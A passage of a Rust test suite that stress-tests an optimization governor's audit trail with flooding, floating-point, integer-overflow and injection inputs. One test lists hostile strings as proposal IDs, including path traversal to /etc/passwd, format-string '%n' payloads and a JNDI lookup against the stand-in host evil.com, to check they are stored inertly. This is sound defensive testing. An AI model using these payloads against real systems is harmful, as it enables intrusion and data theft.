                        throughput: 100.0 + (i % 50) as f64,
                        latency_p99: 50.0,
                        memory_usage: 1500,
                    },
                },
                OptimizationProposal {
                    proposal_id: hash_target_id.clone(),
                    knob: RuntimeKnob::BatchSize,
                    old_value: (i + 500) as u32 % 1000,
                    new_value: (i + 501) as u32 % 1000,
                    predicted_metrics: PredictedMetrics {
                        throughput: 110.0 + (i % 30) as f64,
                        latency_p99: 45.0,
                        memory_usage: 1600,
                    },
                },
            ];

            for proposal in proposals {
                let result = gate.submit(proposal);

                // Track potential collisions
                let hash_key = format!("{:x}",
                    std::collections::hash_map::DefaultHasher::new().finish());
                *collision_attempts.entry(hash_key).or_insert(0) += 1;
            }

            // Verify resistance to birthday attack scenarios
            if i % 1000 == 0 {
                assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

                // Should maintain distinct entries even with collision attempts
                let unique_proposals: std::collections::HashSet<_> = gate.audit_trail()
                    .iter()
                    .map(|e| &e.proposal_id)
                    .collect();

                // Should not lose entries due to hash collisions
                assert!(unique_proposals.len() >= 2 || gate.audit_trail().is_empty());
            }
        }

        // Verify no hash collision has corrupted the audit trail structure
        let final_trail = gate.audit_trail();
        let unique_event_codes: std::collections::HashSet<_> = final_trail
            .iter()
            .map(|e| &e.event_code)
            .collect();

        // Should preserve event code diversity despite collision attempts
        assert!(!unique_event_codes.is_empty());

        // All entries should remain structurally intact
        for entry in final_trail {
            assert!(!entry.event_code.is_empty());
            assert!(!entry.proposal_id.is_empty() || entry.event_code.contains("ERROR"));
        }
    }

    #[test]
    fn test_safety_envelope_boundary_manipulation_precision_attacks() {
        let mut gate = GovernorGate::new(OptimizationGovernor::with_defaults());

        // Extreme: Precision attacks against safety envelope boundaries
        let boundary_attacks = vec![
            // Just inside/outside epsilon boundaries
            (99.9999999999999, 100.0000000000001),   // Epsilon-level precision
            (f64::MAX - 1.0, f64::MAX),               // Maximum boundary
            (0.0, f64::MIN_POSITIVE),                 // Zero boundary
            (1.0 - f64::EPSILON, 1.0 + f64::EPSILON), // Machine epsilon
            (50.0 - 1e-15, 50.0 + 1e-15),            // Ultra-precision boundary
            (1e-308, 1e308),                          // Extreme range
            (1.7976931348623155e308, 1.7976931348623157e308), // Near-overflow
        ];

        for (boundary_low, boundary_high) in boundary_attacks {
            // Test proposals that attempt to exploit floating-point precision
            let precision_proposal = OptimizationProposal {
                proposal_id: format!("precision_boundary_{}_{}", boundary_low, boundary_high),
                knob: RuntimeKnob::DrainTimeoutMs,
                old_value: 1000,
                new_value: 2000,
                predicted_metrics: PredictedMetrics {
                    throughput: boundary_low,
                    latency_p99: boundary_high,
                    memory_usage: 1500,
                },
            };

            let result = gate.submit(precision_proposal);

            // Test live check with precision boundary values
            let boundary_check = PredictedMetrics {
                throughput: if boundary_low.is_finite() { boundary_low } else { 100.0 },
                latency_p99: if boundary_high.is_finite() { boundary_high } else { 50.0 },
                memory_usage: 2000,
            };

            let check_result = gate.live_check(&boundary_check);

            // Verify boundaries are evaluated with appropriate precision tolerance
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

            // Should not accept infinite or NaN values in safety evaluations
            if let Some(last_entry) = gate.audit_trail().last() {
                if last_entry.detail.contains("safety") {
                    assert!(!last_entry.detail.contains("inf"));
                    assert!(!last_entry.detail.contains("NaN"));
                    assert!(!last_entry.detail.contains("±∞"));
                }
            }

            // Test safety envelope calculation with extreme precision
            let extreme_metrics = PredictedMetrics {
                throughput: 1.0000000000000002,  // Just above 1.0 in f64 precision
                latency_p99: 1.0000000000000004,  // Next representable value
                memory_usage: u32::MAX as usize,  // Maximum memory value
            };
            let _ = gate.live_check(&extreme_metrics);
        }

        // Final verification: system should remain stable despite precision attacks
        let final_proposal = OptimizationProposal {
            proposal_id: "stability_check".to_string(),
            knob: RuntimeKnob::CacheCapacity,
            old_value: 512,
            new_value: 1024,
            predicted_metrics: PredictedMetrics {
                throughput: 100.0,
                latency_p99: 50.0,
                memory_usage: 1500,
            },
        };

        let final_result = gate.submit(final_proposal);

        // Should handle normal operations correctly after precision attacks
        assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);
        if let Some(last_entry) = gate.audit_trail().last() {
            assert_eq!(last_entry.proposal_id, "stability_check");
        }
    }

    #[cfg(test)]
    mod optimization_governor_comprehensive_attack_vector_and_boundary_tests {
        use super::*;
        use std::collections::{HashMap, HashSet};

        #[test]
        fn test_audit_trail_capacity_exhaustion_and_memory_pressure_attacks() {
            let mut gate = GovernorGate::with_defaults();

            // Attack 1: Rapid proposal flooding to exhaust memory
            let flood_size = MAX_AUDIT_TRAIL_ENTRIES.saturating_mul(3);
            for i in 0..flood_size {
                let flood_proposal = OptimizationProposal {
                    proposal_id: format!("flood_{}", i),
                    knob: RuntimeKnob::ConcurrencyLimit,
                    old_value: (i % 100) as u32,
                    new_value: ((i % 100) + 1) as u32,
                    predicted_metrics: PredictedMetrics {
                        throughput: (i % 1000) as f64,
                        latency_p99: 50.0,
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(flood_proposal);

                // Verify memory bounds are enforced
                assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES,
                       "Audit trail exceeded max entries at iteration {}", i);
            }

            // Attack 2: Large proposal IDs to exploit string memory allocation
            let massive_id = "A".repeat(usize::MAX.min(100_000));
            let memory_pressure_proposal = OptimizationProposal {
                proposal_id: massive_id.clone(),
                knob: RuntimeKnob::BatchSize,
                old_value: 32,
                new_value: 64,
                predicted_metrics: PredictedMetrics {
                    throughput: 100.0,
                    latency_p99: 50.0,
                    memory_usage: 1500,
                },
            };
            let _ = gate.submit(memory_pressure_proposal);

            // Attack 3: Detail field expansion attacks through malicious values
            let expansion_proposal = OptimizationProposal {
                proposal_id: "detail_expansion".to_string(),
                knob: RuntimeKnob::DrainTimeoutMs,
                old_value: u32::MAX,
                new_value: 0,
                predicted_metrics: PredictedMetrics {
                    throughput: f64::MAX,
                    latency_p99: f64::MIN_POSITIVE,
                    memory_usage: usize::MAX.min(100_000_000),
                },
            };
            let _ = gate.submit(expansion_proposal);

            // Verify system remains stable under memory pressure
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

            // Attack 4: Unicode expansion and normalization attacks
            let unicode_bomb = "\u{0041}\u{0300}".repeat(1000); // Combining characters
            let normalization_attack = OptimizationProposal {
                proposal_id: unicode_bomb.clone(),
                knob: RuntimeKnob::RetryBudget,
                old_value: 10,
                new_value: 20,
                predicted_metrics: PredictedMetrics {
                    throughput: 100.0,
                    latency_p99: 50.0,
                    memory_usage: 1500,
                },
            };
            let _ = gate.submit(normalization_attack);

            // Verify trail preserves original unicode without expansion
            let has_unicode_entry = gate.audit_trail().iter()
                .any(|entry| entry.proposal_id.contains('\u{0041}'));
            assert!(has_unicode_entry || gate.audit_trail().is_empty(),
                   "Unicode characters should be preserved in audit trail");
        }

        #[test]
        fn test_concurrent_modification_and_race_condition_simulation() {
            // Simulate concurrent access patterns that could lead to race conditions
            let mut gate = GovernorGate::with_defaults();

            // Attack 1: Interleaved proposal submission patterns
            let proposals = (0..50).map(|i| {
                OptimizationProposal {
                    proposal_id: format!("concurrent_{}", i),
                    knob: match i % 4 {
                        0 => RuntimeKnob::ConcurrencyLimit,
                        1 => RuntimeKnob::BatchSize,
                        2 => RuntimeKnob::DrainTimeoutMs,
                        _ => RuntimeKnob::RetryBudget,
                    },
                    old_value: (i * 10) % 1000,
                    new_value: ((i * 10) + 50) % 1000,
                    predicted_metrics: PredictedMetrics {
                        throughput: (i as f64 * 1.5) % 1000.0,
                        latency_p99: (i as f64 * 0.8) % 100.0,
                        memory_usage: (i * 100) % 5000,
                    },
                }
            }).collect::<Vec<_>>();

            // Submit in rapid succession to stress concurrent handling
            for proposal in proposals {
                let _ = gate.submit(proposal);
            }

            // Attack 2: Same proposal ID with different content (collision testing)
            let collision_id = "collision_test";
            for i in 0..10 {
                let collision_proposal = OptimizationProposal {
                    proposal_id: collision_id.to_string(),
                    knob: RuntimeKnob::CacheCapacity,
                    old_value: i * 100,
                    new_value: (i + 1) * 100,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0 + (i as f64),
                        latency_p99: 50.0,
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(collision_proposal);
            }

            // Verify audit trail maintains consistency despite collision attempts
            let collision_entries: Vec<_> = gate.audit_trail().iter()
                .filter(|entry| entry.proposal_id == collision_id)
                .collect();
            assert!(!collision_entries.is_empty(), "Should have recorded collision attempts");

            // Attack 3: Rapid live_check calls during proposal submission
            for i in 0..20 {
                let metrics = PredictedMetrics {
                    throughput: (i as f64 * 5.0) % 200.0,
                    latency_p99: (i as f64 * 2.0) % 100.0,
                    memory_usage: (i * 50) % 3000,
                };
                let _ = gate.live_check(&metrics);

                if i % 3 == 0 {
                    let interleaved_proposal = OptimizationProposal {
                        proposal_id: format!("interleaved_{}", i),
                        knob: RuntimeKnob::BatchSize,
                        old_value: 32,
                        new_value: 64,
                        predicted_metrics: metrics,
                    };
                    let _ = gate.submit(interleaved_proposal);
                }
            }

            // Verify state consistency after concurrent operations
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);
            let unique_event_codes: HashSet<_> = gate.audit_trail().iter()
                .map(|e| &e.event_code)
                .collect();
            assert!(!unique_event_codes.is_empty(), "Should maintain event code diversity");
        }

        #[test]
        fn test_floating_point_boundary_attacks_and_arithmetic_overflow() {
            let mut gate = GovernorGate::with_defaults();

            // Attack 1: NaN injection attempts
            let nan_values = vec![f64::NAN, -f64::NAN, f64::INFINITY, f64::NEG_INFINITY];
            for (i, &nan_val) in nan_values.iter().enumerate() {
                let nan_proposal = OptimizationProposal {
                    proposal_id: format!("nan_attack_{}", i),
                    knob: RuntimeKnob::DrainTimeoutMs,
                    old_value: 1000,
                    new_value: 2000,
                    predicted_metrics: PredictedMetrics {
                        throughput: nan_val,
                        latency_p99: if nan_val.is_nan() { 50.0 } else { nan_val },
                        memory_usage: 1500,
                    },
                };
                let decision = gate.submit(nan_proposal);

                // System should handle NaN/infinite values gracefully
                assert!(matches!(decision, GovernorDecision::Approved |
                                GovernorDecision::Rejected(_) |
                                GovernorDecision::Reverted(_) |
                                GovernorDecision::ShadowOnly));
            }

            // Attack 2: Subnormal and extreme boundary values
            let boundary_values = vec![
                f64::MIN_POSITIVE,     // Smallest positive normalized value
                f64::EPSILON,          // Machine epsilon
                1.0 - f64::EPSILON,    // Just below 1.0
                1.0 + f64::EPSILON,    // Just above 1.0
                f64::MAX,              // Maximum finite value
                0.0,                   // Exact zero
                -0.0,                  // Negative zero
                2.2250738585072014e-308, // Subnormal
            ];

            for (i, &boundary_val) in boundary_values.iter().enumerate() {
                let boundary_proposal = OptimizationProposal {
                    proposal_id: format!("boundary_{}", i),
                    knob: RuntimeKnob::ConcurrencyLimit,
                    old_value: 64,
                    new_value: 128,
                    predicted_metrics: PredictedMetrics {
                        throughput: boundary_val,
                        latency_p99: boundary_val.abs().min(1000.0),
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(boundary_proposal);

                // Test live_check with boundary values
                let boundary_metrics = PredictedMetrics {
                    throughput: boundary_val,
                    latency_p99: 50.0,
                    memory_usage: 2000,
                };
                let _ = gate.live_check(&boundary_metrics);
            }

            // Attack 3: Precision loss and rounding error exploitation
            for i in 0..100 {
                let precision_val = 1.0 + (i as f64 * f64::EPSILON);
                let precision_proposal = OptimizationProposal {
                    proposal_id: format!("precision_{}", i),
                    knob: RuntimeKnob::RetryBudget,
                    old_value: 10,
                    new_value: 20,
                    predicted_metrics: PredictedMetrics {
                        throughput: precision_val,
                        latency_p99: precision_val * 50.0,
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(precision_proposal);
            }

            // Verify system stability after floating-point attacks
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

            // Verify no NaN or infinity values leaked into audit details
            for entry in gate.audit_trail() {
                assert!(!entry.detail.to_lowercase().contains("nan"),
                       "Audit detail should not contain NaN: {}", entry.detail);
                assert!(!entry.detail.to_lowercase().contains("inf"),
                       "Audit detail should not contain infinity: {}", entry.detail);
            }
        }

        #[test]
        fn test_proposal_id_injection_and_serialization_attacks() {
            let mut gate = GovernorGate::with_defaults();

            // Attack 1: Control character and escape sequence injection
            let control_chars = vec![
                "\x00\x01\x02\x03\x04\x05\x06\x07", // NULL and control chars
                "\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F", // Backspace, tab, newline, etc.
                "\x10\x11\x12\x13\x14\x15\x16\x17", // More control chars
                "\x7F\x80\x81\x82\x83\x84\x85\x86", // DEL and extended ASCII
                "\u{200B}\u{200C}\u{200D}\u{FEFF}", // Zero-width chars, BOM
                "\u{202A}\u{202B}\u{202C}\u{202D}", // Text direction overrides
            ];

            for (i, control_str) in control_chars.iter().enumerate() {
                let injection_proposal = OptimizationProposal {
                    proposal_id: format!("control_{}_{}", i, control_str),
                    knob: RuntimeKnob::CacheCapacity,
                    old_value: 512,
                    new_value: 1024,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0,
                        latency_p99: 50.0,
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(injection_proposal);
            }

            // Attack 2: JSON/serialization format injection
            let json_injection_attempts = vec![
                r#"{"malicious": "value"}"#,
                r#"\","malicious_field":"injected_value","#,
                r#"null},"injection":{""#,
                "\\u0000\\u0001",
                "\"\\\"/\\b\\f\\n\\r\\t",
            ];

            for (i, injection) in json_injection_attempts.iter().enumerate() {
                let json_proposal = OptimizationProposal {
                    proposal_id: format!("json_injection_{}", injection),
                    knob: RuntimeKnob::DrainTimeoutMs,
                    old_value: 1000,
                    new_value: 2000,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0,
                        latency_p99: 50.0,
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(json_proposal);
            }

            // Attack 3: Path traversal and format string attacks in proposal IDs
            let traversal_attacks = vec![
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\cmd.exe",
                "/dev/null",
                "/proc/self/mem",
                "%s%s%s%s%s%n%n%n%n%n",
                "%x%x%x%x%x%n%n%n%n%n",
                "${jndi:ldap://evil.com}",
            ];

            for (i, attack_str) in traversal_attacks.iter().enumerate() {
                let traversal_proposal = OptimizationProposal {
                    proposal_id: attack_str.to_string(),
                    knob: RuntimeKnob::BatchSize,
                    old_value: 32,
                    new_value: 64,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0,
                        latency_p99: 50.0,
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(traversal_proposal);
            }

            // Verify system preserved all proposal IDs without corruption
            let preserved_attacks: Vec<_> = gate.audit_trail().iter()
                .filter(|entry| {
                    traversal_attacks.iter().any(|&attack| entry.proposal_id.contains(attack)) ||
                    json_injection_attempts.iter().any(|&injection| entry.proposal_id.contains(injection))
                })
                .collect();

            // Should have preserved malicious strings as-is (no execution)
            assert!(!preserved_attacks.is_empty(), "Should preserve injection attempts in audit trail");

            // Attack 4: Unicode normalization and homograph attacks
            let unicode_attacks = vec![
                "normal_text",
                "Аdmin", // Cyrillic 'А' instead of Latin 'A'
                "аpple", // Cyrillic 'а' instead of Latin 'a'
                "micro_µ_vs_μ", // Micro sign vs Greek mu
                "café_vs_cafe\u{0301}", // Precomposed vs decomposed
            ];

            for attack in unicode_attacks {
                let unicode_proposal = OptimizationProposal {
                    proposal_id: attack.to_string(),
                    knob: RuntimeKnob::RetryBudget,
                    old_value: 5,
                    new_value: 10,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0,
                        latency_p99: 50.0,
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(unicode_proposal);
            }

            // Verify audit trail maintains data integrity
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);
            for entry in gate.audit_trail() {
                assert!(!entry.proposal_id.is_empty() || entry.event_code.contains("ERROR"));
                assert!(!entry.event_code.is_empty());
            }
        }

        #[test]
        fn test_knob_value_boundary_violations_and_integer_attacks() {
            let mut gate = GovernorGate::with_defaults();

            // Attack 1: Integer overflow and underflow attempts
            let integer_boundary_attacks = vec![
                (0, 1),                    // Minimum to minimum+1
                (1, 0),                    // Minimum+1 to minimum
                (u32::MAX - 1, u32::MAX),  // Near maximum
                (u32::MAX, u32::MAX - 1),  // Maximum to near maximum
                (u32::MAX, 0),             // Maximum to minimum (massive decrease)
                (0, u32::MAX),             // Minimum to maximum (massive increase)
                (u32::MAX / 2, u32::MAX / 2 + 1), // Around midpoint
            ];

            for (i, (old_val, new_val)) in integer_boundary_attacks.iter().enumerate() {
                for knob in [RuntimeKnob::ConcurrencyLimit, RuntimeKnob::BatchSize,
                            RuntimeKnob::DrainTimeoutMs, RuntimeKnob::RetryBudget] {
                    let boundary_proposal = OptimizationProposal {
                        proposal_id: format!("boundary_{}_{}_{}_{:?}", i, old_val, new_val, knob),
                        knob,
                        old_value: *old_val,
                        new_value: *new_val,
                        predicted_metrics: PredictedMetrics {
                            throughput: 100.0,
                            latency_p99: 50.0,
                            memory_usage: 1500,
                        },
                    };
                    let decision = gate.submit(boundary_proposal);

                    // All boundary values should be processed (inner governor decides acceptance)
                    assert!(matches!(decision, GovernorDecision::Approved |
                                    GovernorDecision::Rejected(_) |
                                    GovernorDecision::Reverted(_) |
                                    GovernorDecision::ShadowOnly));
                }
            }

            // Attack 2: Sequence overflow in rapid succession
            let base_val = u32::MAX - 100;
            for i in 0..200 {
                let overflow_val = base_val.saturating_add(i);
                let sequence_proposal = OptimizationProposal {
                    proposal_id: format!("sequence_overflow_{}", i),
                    knob: RuntimeKnob::CacheCapacity,
                    old_value: overflow_val.saturating_sub(1),
                    new_value: overflow_val,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0,
                        latency_p99: 50.0,
                        memory_usage: (base_val as usize).saturating_add(i as usize * 100),
                    },
                };
                let _ = gate.submit(sequence_proposal);
            }

            // Attack 3: Alternating min/max value oscillation
            for i in 0..50 {
                let (old_val, new_val) = if i % 2 == 0 {
                    (0, u32::MAX)
                } else {
                    (u32::MAX, 0)
                };

                let oscillation_proposal = OptimizationProposal {
                    proposal_id: format!("oscillation_{}", i),
                    knob: RuntimeKnob::DrainTimeoutMs,
                    old_value: old_val,
                    new_value: new_val,
                    predicted_metrics: PredictedMetrics {
                        throughput: if i % 4 == 0 { f64::MAX } else { f64::MIN_POSITIVE },
                        latency_p99: 50.0,
                        memory_usage: if i % 3 == 0 { usize::MAX.min(100_000_000) } else { 1 },
                    },
                };
                let _ = gate.submit(oscillation_proposal);
            }

            // Verify system stability after integer boundary attacks
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

            // Verify no integer overflow corrupted audit detail formatting
            for entry in gate.audit_trail() {
                assert!(!entry.detail.is_empty() || entry.event_code.contains("ERROR"));

                // Check that extreme values are properly formatted in details
                if entry.detail.contains("old=") && entry.detail.contains("new=") {
                    // Should contain valid integer representations, not overflowed values
                    assert!(!entry.detail.contains("−"), "Should not contain minus sign corruption");
                    assert!(!entry.detail.contains("overflow"), "Should not explicitly mention overflow");
                }
            }
        }

        #[test]
        fn test_audit_trail_ordering_consistency_and_temporal_attacks() {
            let mut gate = GovernorGate::with_defaults();

            // Attack 1: Rapid-fire submissions to disrupt ordering
            let rapid_proposals: Vec<_> = (0..100).map(|i| {
                OptimizationProposal {
                    proposal_id: format!("rapid_{:03}", i), // Zero-padded for ordering tests
                    knob: match i % 4 {
                        0 => RuntimeKnob::ConcurrencyLimit,
                        1 => RuntimeKnob::BatchSize,
                        2 => RuntimeKnob::DrainTimeoutMs,
                        _ => RuntimeKnob::RetryBudget,
                    },
                    old_value: i as u32,
                    new_value: (i + 1) as u32,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0 + (i as f64),
                        latency_p99: 50.0,
                        memory_usage: 1500,
                    },
                }
            }).collect();

            // Submit all proposals in rapid succession
            for proposal in rapid_proposals {
                let _ = gate.submit(proposal);
            }

            // Verify audit trail maintains chronological ordering
            let mut last_seen_indices = HashMap::new();
            for (trail_idx, entry) in gate.audit_trail().iter().enumerate() {
                if entry.proposal_id.starts_with("rapid_") {
                    if let Some(last_idx) = last_seen_indices.get(&entry.proposal_id) {
                        assert!(*last_idx < trail_idx,
                               "Events for proposal {} are out of chronological order", entry.proposal_id);
                    }
                    last_seen_indices.insert(entry.proposal_id.clone(), trail_idx);
                }
            }

            // Attack 2: Interleaved proposals with live_check calls
            for i in 0..30 {
                let proposal = OptimizationProposal {
                    proposal_id: format!("interleaved_{}", i),
                    knob: RuntimeKnob::CacheCapacity,
                    old_value: i * 10,
                    new_value: (i + 1) * 10,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0 + (i as f64),
                        latency_p99: 50.0,
                        memory_usage: 1500 + (i * 50),
                    },
                };

                let baseline_trail_len = gate.audit_trail().len();
                let _ = gate.submit(proposal);
                let post_submit_trail_len = gate.audit_trail().len();

                // Interleave with live check
                let check_metrics = PredictedMetrics {
                    throughput: 120.0 + (i as f64),
                    latency_p99: 45.0,
                    memory_usage: 1600,
                };
                let _ = gate.live_check(&check_metrics);
                let post_check_trail_len = gate.audit_trail().len();

                // Verify submit operations consistently add events
                assert!(post_submit_trail_len >= baseline_trail_len,
                       "Submit should add events to audit trail");

                // live_check might or might not add events, but shouldn't corrupt ordering
                assert!(post_check_trail_len >= post_submit_trail_len ||
                       post_check_trail_len == post_submit_trail_len,
                       "live_check should not remove audit events");
            }

            // Attack 3: Identical proposal IDs with different timing
            let collision_id = "timing_collision";
            let timing_metrics = vec![
                PredictedMetrics { throughput: 90.0, latency_p99: 60.0, memory_usage: 1400 },
                PredictedMetrics { throughput: 110.0, latency_p99: 40.0, memory_usage: 1600 },
                PredictedMetrics { throughput: 100.0, latency_p99: 50.0, memory_usage: 1500 },
            ];

            for (i, metrics) in timing_metrics.iter().enumerate() {
                let collision_proposal = OptimizationProposal {
                    proposal_id: collision_id.to_string(),
                    knob: RuntimeKnob::BatchSize,
                    old_value: (i * 32) as u32,
                    new_value: ((i + 1) * 32) as u32,
                    predicted_metrics: *metrics,
                };
                let _ = gate.submit(collision_proposal);

                // Add delay simulation through additional operations
                for j in 0..5 {
                    let delay_metrics = PredictedMetrics {
                        throughput: 100.0 + (j as f64),
                        latency_p99: 50.0,
                        memory_usage: 1500,
                    };
                    let _ = gate.live_check(&delay_metrics);
                }
            }

            // Verify ordering consistency despite timing collisions
            let collision_events: Vec<_> = gate.audit_trail().iter()
                .enumerate()
                .filter(|(_, entry)| entry.proposal_id == collision_id)
                .collect();

            assert!(!collision_events.is_empty(), "Should have recorded collision events");

            // Events for same proposal ID should appear in submission order
            for i in 1..collision_events.len() {
                let (prev_idx, _) = collision_events[i - 1];
                let (curr_idx, _) = collision_events[i];
                assert!(prev_idx < curr_idx, "Collision events should maintain temporal ordering");
            }

            // Final verification: audit trail should remain bounded and consistent
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

            // All events should have valid structure
            for entry in gate.audit_trail() {
                assert!(!entry.event_code.is_empty(), "Event code should not be empty");
                assert!(!entry.detail.is_empty() || entry.event_code.contains("ERROR"),
                       "Detail should not be empty unless error event");
            }
        }

        #[test]
        fn test_safety_envelope_manipulation_and_threshold_bypass_attacks() {
            let mut gate = GovernorGate::with_defaults();

            // Attack 1: Gradual threshold creeping to bypass safety envelopes
            let mut current_throughput = 50.0;
            let mut current_latency = 25.0;
            let mut current_memory = 750;

            for i in 0..200 {
                // Gradually increase each metric to attempt threshold bypass
                current_throughput += 0.1;
                current_latency += 0.05;
                current_memory += 10;

                let creeping_proposal = OptimizationProposal {
                    proposal_id: format!("threshold_creep_{}", i),
                    knob: RuntimeKnob::ConcurrencyLimit,
                    old_value: 64 + (i % 20) as u32,
                    new_value: 65 + (i % 20) as u32,
                    predicted_metrics: PredictedMetrics {
                        throughput: current_throughput,
                        latency_p99: current_latency,
                        memory_usage: current_memory,
                    },
                };
                let decision = gate.submit(creeping_proposal);

                // Periodically perform live checks to test envelope enforcement
                if i % 10 == 0 {
                    let check_metrics = PredictedMetrics {
                        throughput: current_throughput + 10.0,
                        latency_p99: current_latency + 5.0,
                        memory_usage: current_memory + 500,
                    };
                    let _ = gate.live_check(&check_metrics);
                }
            }

            // Attack 2: Oscillating metric values to confuse envelope calculations
            for i in 0..100 {
                let oscillation_factor = (i as f64 * 0.1).sin();
                let oscillation_proposal = OptimizationProposal {
                    proposal_id: format!("envelope_oscillation_{}", i),
                    knob: RuntimeKnob::DrainTimeoutMs,
                    old_value: 1000,
                    new_value: 1100,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0 + (oscillation_factor * 50.0),
                        latency_p99: 50.0 + (oscillation_factor * 20.0),
                        memory_usage: (1500.0 + (oscillation_factor * 500.0)) as usize,
                    },
                };
                let _ = gate.submit(oscillation_proposal);

                // Complementary live check with opposite phase
                let opposite_metrics = PredictedMetrics {
                    throughput: 100.0 - (oscillation_factor * 50.0),
                    latency_p99: 50.0 - (oscillation_factor * 20.0),
                    memory_usage: (1500.0 - (oscillation_factor * 500.0)) as usize,
                };
                let _ = gate.live_check(&opposite_metrics);
            }

            // Attack 3: Extreme metric ratios to exploit envelope calculation vulnerabilities
            let extreme_ratios = vec![
                (1.0, 1000.0, 100),          // Very low throughput, high latency, low memory
                (10000.0, 0.1, 100000),      // Very high throughput, low latency, high memory
                (100.0, 500.0, 1),           // Balanced throughput/latency, minimal memory
                (0.001, 0.001, 10000000),    // Minimal throughput/latency, extreme memory
                (f64::MAX, 1.0, 1500),       // Extreme throughput, normal latency/memory
                (100.0, f64::MAX, 1500),     // Normal throughput, extreme latency
            ];

            for (i, (throughput, latency, memory)) in extreme_ratios.iter().enumerate() {
                let ratio_proposal = OptimizationProposal {
                    proposal_id: format!("extreme_ratio_{}", i),
                    knob: RuntimeKnob::RetryBudget,
                    old_value: 10,
                    new_value: 20,
                    predicted_metrics: PredictedMetrics {
                        throughput: if throughput.is_finite() { *throughput } else { 100.0 },
                        latency_p99: if latency.is_finite() { *latency } else { 50.0 },
                        memory_usage: *memory as usize,
                    },
                };
                let _ = gate.submit(ratio_proposal);

                // Test envelope consistency with extreme ratios
                let ratio_check = PredictedMetrics {
                    throughput: if throughput.is_finite() && *throughput > 0.0 { *throughput / 2.0 } else { 50.0 },
                    latency_p99: if latency.is_finite() && *latency > 0.0 { *latency / 2.0 } else { 25.0 },
                    memory_usage: (*memory as usize / 2).max(1),
                };
                let _ = gate.live_check(&ratio_check);
            }

            // Attack 4: Safety envelope boundary precision attacks
            for i in 0..50 {
                let boundary_offset = f64::EPSILON * (i as f64 + 1.0);
                let precision_proposal = OptimizationProposal {
                    proposal_id: format!("precision_envelope_{}", i),
                    knob: RuntimeKnob::CacheCapacity,
                    old_value: 512,
                    new_value: 1024,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0 + boundary_offset,
                        latency_p99: 50.0 - boundary_offset,
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(precision_proposal);
            }

            // Verify safety envelope enforcement remained consistent
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

            // Count envelope-related events
            let envelope_events = gate.audit_trail().iter()
                .filter(|entry| entry.event_code.contains("SAFETY") ||
                               entry.detail.to_lowercase().contains("envelope"))
                .count();

            // Should have some envelope-related activity due to extreme values
            assert!(envelope_events > 0 || gate.audit_trail().is_empty(),
                   "Should have recorded safety envelope activity");

            // Verify no corruption in safety-related audit entries
            for entry in gate.audit_trail() {
                if entry.event_code.contains("SAFETY") || entry.detail.to_lowercase().contains("envelope") {
                    assert!(!entry.detail.to_lowercase().contains("nan"),
                           "Safety events should not contain NaN");
                    assert!(!entry.detail.to_lowercase().contains("inf"),
                           "Safety events should not contain infinity");
                }
            }
        }

        #[test]
        fn test_resource_exhaustion_through_complex_proposal_patterns() {
            let mut gate = GovernorGate::with_defaults();

            // Attack 1: Complex nested proposal structures to exhaust processing
            for complexity_level in 0..10 {
                for iteration in 0..20 {
                    // Create increasingly complex proposal patterns
                    let complex_id = format!("complex_{}_{}_{}_{}_{}_{}",
                                           complexity_level, iteration,
                                           "layer1", "layer2", "layer3", "final");

                    let complex_proposal = OptimizationProposal {
                        proposal_id: complex_id,
                        knob: match (complexity_level + iteration) % 4 {
                            0 => RuntimeKnob::ConcurrencyLimit,
                            1 => RuntimeKnob::BatchSize,
                            2 => RuntimeKnob::DrainTimeoutMs,
                            _ => RuntimeKnob::RetryBudget,
                        },
                        old_value: ((complexity_level * iteration) % 1000) as u32,
                        new_value: (((complexity_level + 1) * (iteration + 1)) % 1000) as u32,
                        predicted_metrics: PredictedMetrics {
                            throughput: (complexity_level as f64) * (iteration as f64) * 0.5,
                            latency_p99: 50.0 + (complexity_level as f64) * 2.0,
                            memory_usage: 1500 + (complexity_level * iteration * 100),
                        },
                    };
                    let _ = gate.submit(complex_proposal);

                    // Interleave with complex live checks
                    for live_check_round in 0..complexity_level.max(1) {
                        let complex_metrics = PredictedMetrics {
                            throughput: 100.0 + (live_check_round as f64) * 5.0,
                            latency_p99: 50.0 - (live_check_round as f64),
                            memory_usage: 1500 + (live_check_round * 200),
                        };
                        let _ = gate.live_check(&complex_metrics);
                    }
                }
            }

            // Attack 2: Resource exhaustion through repeated identical operations
            let exhaustion_proposal = OptimizationProposal {
                proposal_id: "exhaustion_base".to_string(),
                knob: RuntimeKnob::CacheCapacity,
                old_value: 1024,
                new_value: 2048,
                predicted_metrics: PredictedMetrics {
                    throughput: 100.0,
                    latency_p99: 50.0,
                    memory_usage: 1500,
                },
            };

